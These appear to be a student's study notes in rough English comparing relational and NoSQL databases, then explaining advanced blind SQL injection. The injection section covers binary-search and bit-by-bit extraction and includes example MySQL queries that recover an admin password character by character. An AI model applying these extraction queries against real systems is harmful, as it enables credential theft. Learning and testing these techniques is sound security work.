## RDBMS : Relational Database Management System

> RDBMS has limit of capacity because it use second-dementional table.

## NRDBMS : Non - RDBMS (NoSQL)

#### NoSQL also generate query dynamically -> sqli can cause.

#### NoSQL use key-value storing method while RDBMS use TABLE. -> Optimized store capacity.


## ExploitTech : blind sqli advanced  
#### Binary Search : ___Binary Search based on a assumtion that data is sorted.___ Set range(n,m). As example, let range as (0,100). This method compare target data with middle-orderd data, and regenerate data range (0,50) if target <= middle else range(51, 100). repeat it so that target be captured  
> example
> ```sql
> mysql> select * from users where username='admin' and ascii(substr(password, 1, 1))>79;
> /* This exploit compare first word of password with ascii_middle_value:79 */
> ```
#### Bit Calculation : ascii letter can express range from 0 to 127 so that we can express it also with 7 bit. By using repeat of exploit statement including useful function like `bin` and `substr`, we can find password
> example
> ```sql
> mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
> mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
> ...
> mysql> select * from users where username='admin' and substr(bin(ord(password)),7,1)=1;
> ```
